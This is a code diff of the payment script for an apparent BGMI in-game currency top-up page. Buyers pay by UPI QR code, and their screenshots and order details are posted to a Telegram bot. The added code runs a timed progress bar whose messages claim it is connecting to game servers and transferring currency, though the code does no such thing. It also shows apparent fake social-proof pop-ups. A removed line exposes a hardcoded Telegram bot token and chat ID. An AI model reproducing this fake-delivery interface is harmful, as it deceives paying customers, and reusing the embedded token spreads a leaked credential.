-      amountEl.textContent = '₹' + selectedPack.price;
+      document.getElementById('paymentAmount').textContent = '₹' + selectedPack.price;
       orderId = generateOrderId();
-      document.getElementById('upiIdText').textContent = UPIVPA;
       
-      const warningEl = document.getElementById('highValueWarning');
-      if (parseInt(selectedPack.price) > 2000) {
-          warningEl.style.display = 'block';
-      } else {
-          warningEl.style.display = 'none';
-      }
-        
-      const qrImage = document.getElementById('staticQrImage');
-      const loader = document.getElementById('qrLoader');
-        
-      qrImage.style.display = 'none';
-      loader.style.display = 'block';
-
-      const qrFilename = `${selectedPack.price}qr.webp`;
-      qrImage.src = qrFilename;
-
-      qrImage.onload = function(){
-          loader.style.display = 'none';
-          qrImage.style.display = 'block';
-          startQRTimer();
-      };
-
-      qrImage.onerror = function(){
-          loader.style.display = 'none';
-          console.log(`Image missing: ${qrFilename}`);
-      };
+      // Update dynamic QR Code Image based on price
+      document.getElementById('paymentQR').src = selectedPack.price + 'qr.webp';
+      
+      // Reset Upload UI
+      resetUploadUI();
 
       showStep(3);
     };
 
-    document.getElementById('back3').onclick = () => {
-      if(qrTimer) clearInterval(qrTimer);
-      showStep(2);
-    };
+    document.getElementById('back3').onclick = () => showStep(2);
 
-    document.getElementById('copyUpiBtn').onclick = async function(){
-      triggerHaptic('light');
-      try {
-          await navigator.clipboard.writeText(UPIVPA);
-          showToast('UPI ID copied!');
-      } catch (err) { alert("UPI ID: " + UPIVPA); }
-    };
+    // --- SCREENSHOT UPLOAD LOGIC ---
+    const uploadBox = document.getElementById('uploadBox');
+    const fileInput = document.getElementById('screenshotInput');
+    const previewWrapper = document.getElementById('previewWrapper');
+    const screenshotPreview = document.getElementById('screenshotPreview');
+    const removeBtn = document.getElementById('removeScreenshotBtn');
+    const submitBtn = document.getElementById('submitPaymentBtn');
+    
+    let uploadedFile = null;
 
-    const fileInput = document.getElementById('screenshot');
-    const preview = document.getElementById('screenshotPreview');
-    const uploadArea = document.getElementById('uploadArea');
-    const submitBtn = document.getElementById('submitBtn');
-
-    uploadArea.addEventListener('dragover', (e) => { e.preventDefault(); uploadArea.classList.add('dragover'); });
-    uploadArea.addEventListener('dragleave', () => { uploadArea.classList.remove('dragover'); });
-    uploadArea.addEventListener('drop', (e) => {
-      e.preventDefault();
-      uploadArea.classList.remove('dragover');
-      const file = e.dataTransfer.files[0];
-      if(file && file.type.startsWith('image/')) handleFileUpload(file);
+    // Jab div par click ho, tab file input ko trigger karein
+    uploadBox.addEventListener('click', () => {
+      fileInput.click();
     });
 
-    uploadArea.onclick = () => fileInput.click();
-    fileInput.onchange = (e) => { const file = e.target.files[0]; if(file) handleFileUpload(file); };
-
-    function handleFileUpload(file){
-      if(file.size <= 5*1024*1024){
-        screenshotFile = file;
+    // Jab file select ho jaye
+    fileInput.addEventListener('change', function(e) {
+      if(this.files && this.files[0]) {
+        uploadedFile = this.files[0];
+        
+        // FileReader se image ko preview me dikhana
         const reader = new FileReader();
-        reader.onload = (evt) => {
-          preview.src = evt.target.result;
-          preview.style.display = 'block';
-          const progressBar = document.getElementById('uploadProgress');
-          let width = 0;
-          const interval = setInterval(() => {
-            if(width >= 100){
-              clearInterval(interval);
-              document.getElementById('uploadIcon').style.display = 'none';
-              document.getElementById('uploadSuccessIcon').style.display = 'inline-block';
-              document.getElementById('uploadText').textContent = 'Screenshot Attached';
-              submitBtn.style.display = 'block';
-              triggerHaptic('success');
-            } else { width += 5; progressBar.style.width = width + '%'; }
-          }, 20);
-        };
-        reader.readAsDataURL(file);
-      } else {
-        alert("File too large. Please upload under 5MB.");
+        reader.onload = function(e) {
+          screenshotPreview.src = e.target.result;
+          uploadBox.style.display = 'none'; // Upload box chhupa do
+          previewWrapper.style.display = 'block'; // Preview dikhao
+          
+          submitBtn.disabled = false; // Button enable kar do
+          triggerHaptic('light');
+        }
+        reader.readAsDataURL(uploadedFile);
       }
+    });
+
+    // Remove screenshot button
+    removeBtn.addEventListener('click', () => {
+      resetUploadUI();
+      triggerHaptic('light');
+    });
+
+    // Function to reset the upload section
+    function resetUploadUI() {
+      uploadedFile = null;
+      fileInput.value = '';
+      screenshotPreview.src = '';
+      uploadBox.style.display = 'block';
+      previewWrapper.style.display = 'none';
+      submitBtn.disabled = true; // Button wapas disable
+    }
+
+
+    // --- SUBMIT PAYMENT LOGIC WITH TELEGRAM PHOTO API ---
+    submitBtn.onclick = async function(e){
+        e.preventDefault();
+        
+        if (!uploadedFile) {
+            showToast("Please upload screenshot first!");
+            return;
+        }
+
+        const btn = document.getElementById('submitPaymentBtn');
+        const originalText = btn.innerHTML;
+        btn.disabled = true;
+        
+        // Loader on button
+        btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Submitting...`;
+
+        await processOrderSuccess();
+    };
+
+    async function processOrderSuccess() {
+        const time = new Date().toLocaleString('en-IN', { timeZone:'Asia/Kolkata' });
+        
+        // BUG FIX: BGMI Names me special characters hone par Telegram API break na ho, 
+        // iske liye HTML format use kar rahe hain aur symbols ko safe kar rahe hain.
+        const safeIgn = currentIgn.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+          
+        const captionText = `✅ <b>NEW ORDER SCREENSHOT</b> ✅\n\n<b>Order ID:</b> <code>${orderId}</code>\n<b>UID:</b> <code>${currentUid}</code>\n<b>IGN:</b> ${safeIgn}\n<b>Pack:</b> ${selectedPack.uc} UC\n<b>Amount To Verify:</b> ₹${selectedPack.price}\n<b>Time:</b> ${time}`;
+
+        try {
+          if(TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE") {
+              
+              const formData = new FormData();
+              formData.append('chat_id', TELEGRAM_CHAT_ID);
+              formData.append('photo', uploadedFile); 
+              formData.append('caption', captionText);
+              formData.append('parse_mode', 'HTML'); // Changed from Markdown to HTML for safety
+
+              // Pehle Photo bhejne ki try karega
+              let response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                  method: 'POST',
+                  body: formData 
+              });
+
+              let result = await response.json();
+              
+              // FALLBACK SYSTEM: Agar user ki file bohot badi hai ya format galat hai, 
+              // toh photo fail ho jayegi lekin sirf Text message aapko zaroor aa jayega.
+              if (!result.ok) {
+                  console.error("Photo Error:", result);
+                  
+                  const fallbackText = captionText + "\n\n⚠️ <i>Screenshot upload failed, but order received. Please check payment app manually.</i>";
+                  
+                  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                      method: 'POST',
+                      headers: {'Content-Type': 'application/json'},
+                      body: JSON.stringify({
+                          chat_id: TELEGRAM_CHAT_ID,
+                          text: fallbackText,
+                          parse_mode: 'HTML'
+                      })
+                  });
+              }
+          }
+          if(APPS_SCRIPT_URL) {
+              await fetch(APPS_SCRIPT_URL, {
+                  method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'},
+                  body: JSON.stringify({ uid: currentUid, uc: selectedPack.uc })
+              });
+          }
+        } catch(err) { 
+            console.error("Network or API Error:", err); 
+        }
+
+        document.getElementById('orderIdText').textContent = orderId;
+        document.getElementById('receipt-pack').textContent = selectedPack.uc + " UC";
+        document.getElementById('receipt-amount').textContent = "₹" + selectedPack.price;
+        document.getElementById('receipt-uid').textContent = currentUid;
+        document.getElementById('receipt-ign').textContent = currentIgn;
+        document.getElementById('receipt-time').textContent = time;
+          
+        showStep(4);
+        triggerHaptic('success');
+          
+        localStorage.removeItem('bgmiTimerEnd');
+        const currentHour = getIndiaHour();
+        if (currentHour >= 0 && currentHour < 9) {
+            document.getElementById('gameLoaderWrap').style.display = 'none';
+            document.getElementById('nightMessage').style.display = 'block';
+            document.getElementById('newOrderBtn').style.display = 'block';
+        } else {
+            document.getElementById('gameLoaderWrap').style.display = 'block';
+            document.getElementById('nightMessage').style.display = 'none';
+            startDeliveryTimer();
+        }
     }
 
     function startDeliveryTimer() {
@@ -1340,143 +1548,36 @@
         const fillBar = document.getElementById('gameBarFill');
         const msg = document.getElementById('deliveryMsg');
 
-        let endTime = localStorage.getItem('bgmiTimerEnd');
-        
-        if (!endTime) {
-            endTime = new Date().getTime() + (duration * 1000);
-            localStorage.setItem('bgmiTimerEnd', endTime);
-        }
+        let endTime = localStorage.getItem('bgmiTimerEnd') || (new Date().getTime() + (duration * 1000));
+        localStorage.setItem('bgmiTimerEnd', endTime);
 
         const timerInterval = setInterval(() => {
-            const now = new Date().getTime();
-            const distance = endTime - now;
+            const distance = endTime - new Date().getTime();
             let secondsLeft = Math.floor(distance / 1000);
             
             if (distance < 0) {
                 clearInterval(timerInterval);
                 fillBar.style.width = "100%";
                 msg.textContent = "Completed";
-                
                 document.getElementById('gameLoaderWrap').style.display = 'none';
                 document.getElementById('finalSuccessMsg').style.display = 'block';
                 document.getElementById('newOrderBtn').style.display = 'block';
-                
                 localStorage.removeItem('bgmiTimerEnd');
-                createConfetti();
-                triggerHaptic('success');
+                createConfetti(); triggerHaptic('success');
                 return;
             }
 
-            const m = Math.floor(secondsLeft / 60);
-            const s = secondsLeft % 60;
-            timerText.textContent = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-            
-            const totalDuration = 420; 
-            const percentage = ((totalDuration - secondsLeft) / totalDuration) * 100;
+            timerText.textContent = `${Math.floor(secondsLeft / 60).toString().padStart(2,'0')}:${(secondsLeft % 60).toString().padStart(2,'0')}`;
+            const percentage = ((duration - secondsLeft) / duration) * 100;
             fillBar.style.width = percentage + "%";
             
-            if(percentage < 20) msg.textContent = "Connecting to BGMI Servers...";
-            if(percentage >= 20 && percentage < 40) msg.textContent = "Connecting to BGMI Servers...";
-            if(percentage >= 40 && percentage < 60) msg.textContent = "Verifying UID & Player Name...";
-            if(percentage >= 60 && percentage < 80) msg.textContent = "Initiating UC Transfer...";
-            if(percentage >= 80 && percentage < 99) msg.textContent = "Finalizing Transaction...";
+            if(percentage < 40) msg.textContent = "Connecting to BGMI Servers...";
+            else if(percentage < 60) msg.textContent = "Verifying UID & Player Name...";
+            else if(percentage < 80) msg.textContent = "Initiating UC Transfer...";
+            else msg.textContent = "Finalizing Transaction...";
             
         }, 1000);
     }
-
-    // Handle Form Submission via AJAX to TELEGRAM BOT
-    document.getElementById('orderForm').onsubmit = async (e) => {
-      e.preventDefault();
-      
-      if(!screenshotFile) {
-          alert("Please upload a payment screenshot first.");
-          return;
-      }
-      
-      if(TELEGRAM_BOT_TOKEN === "8668609128:AAFIDi9YPVTI-IuyDEe1SwNMxP4R_mtCJYc" || TELEGRAM_CHAT_ID === "6444071433") {
-          alert("Setup Required: Please add your Telegram Bot Token and Chat ID in the code.");
-          return;
-      }
-
-      submitBtn.disabled = true;
-      submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
-      const time = new Date().toLocaleString('en-IN', { timeZone:'Asia/Kolkata' });
-        
-      // Prepare the beautifully formatted message for Telegram
-      const caption = `🔥 *NEW UC ORDER* 🔥\n\n` +
-                      `*Order ID:* \`${orderId}\`\n` +
-                      `*UID:* \`${currentUid}\`\n` +
-                      `*IGN:* ${currentIgn}\n` +
-                      `*Pack:* ${selectedPack.uc} UC\n` +
-                      `*Amount:* ₹${selectedPack.price}\n` +
-                      `*Time:* ${time}`;
-
-      // Create FormData to send image and text to Telegram
-      const formData = new FormData();
-      formData.append('chat_id', TELEGRAM_CHAT_ID);
-      formData.append('photo', screenshotFile);
-      formData.append('caption', caption);
-      formData.append('parse_mode', 'Markdown'); // Allows bolding and formatting
-
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { 
-            method: 'POST', 
-            body: formData
-        });
-        
-        const result = await res.json();
-        
-        if(res.ok && result.ok) {
-          // Send to Google Sheets (Backup for your tracking)
-          if(APPS_SCRIPT_URL) {
-             try {
-                const sheetData = { uid: currentUid, uc: selectedPack.uc };
-                await fetch(APPS_SCRIPT_URL, {
-                    method: 'POST',
-                    mode: 'no-cors', 
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(sheetData)
-                });
-             } catch(sheetErr) { console.log(sheetErr); }
-          }
-
-          document.getElementById('orderIdText').textContent = orderId;
-          document.getElementById('receipt-pack').textContent = selectedPack.uc + " UC";
-          document.getElementById('receipt-amount').textContent = "₹" + selectedPack.price;
-          document.getElementById('receipt-uid').textContent = currentUid;
-          document.getElementById('receipt-ign').textContent = currentIgn;
-          document.getElementById('receipt-time').textContent = time;
-          if(qrTimer) clearInterval(qrTimer);
-            
-          showStep(4);
-          triggerHaptic('success');
-            
-          localStorage.removeItem('bgmiTimerEnd');
-
-          const currentHour = getIndiaHour();
-          const isNightTime = (currentHour >= 0 && currentHour < 9);
-
-          if (isNightTime) {
-              document.getElementById('gameLoaderWrap').style.display = 'none';
-              document.getElementById('nightMessage').style.display = 'block';
-              document.getElementById('newOrderBtn').style.display = 'block';
-          } else {
-              document.getElementById('gameLoaderWrap').style.display = 'block';
-              document.getElementById('nightMessage').style.display = 'none';
-              startDeliveryTimer();
-          }
-            
-        } else {
-            throw new Error(result.description || "Telegram submission failed");
-        }
-      } catch(err) {
-        alert("Submission failed. Please check your connection and try again.");
-        console.error(err);
-        submitBtn.disabled = false;
-        submitBtn.textContent = "Confirm Order";
-      }
-    };
-    
     setTimeout(showSocialProof, 3000);
   </script>
 </body>
